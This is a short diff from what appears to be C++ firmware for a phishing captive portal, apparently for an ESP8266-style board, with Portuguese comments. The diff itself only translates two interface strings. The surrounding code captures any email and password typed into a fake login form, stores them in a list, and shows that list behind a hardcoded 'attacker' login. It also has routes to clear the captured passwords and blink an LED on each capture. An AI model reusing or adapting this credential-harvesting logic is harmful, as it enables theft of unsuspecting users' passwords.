@@ -85,7 +85,7 @@ String index() {   // Página com o formulario para captura das "Credenciais".
   //Caso seja o "Atacante" entrando com seu login e senha, redireciona para a página com as credenciais capturadas.
   
    if (email == "darkhorse" && password == "1425") {  //Login do "Atacante", para acesso as Credenciais capturadas.
-  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();   }
+  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar para Inicio</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();   }
    else {
   Credentials="<li>User: <b>" + email + "</b></br>Password: <b>" + password + "</b></li><br /><br />" + Credentials;
   return header(POST_TITLE) + POST_BODY + footer();
@@ -96,7 +96,7 @@ String clear() {
   String email="<p></p>";
   String password="<p></p>";
   Credentials="<p></p>";
-  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
+  return header(CLEAR_TITLE) + "<div><p>Lista de credenciais resetada.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
 void BLINKPASS() {//Piscar 3 vezes quando Receber uma "Password".
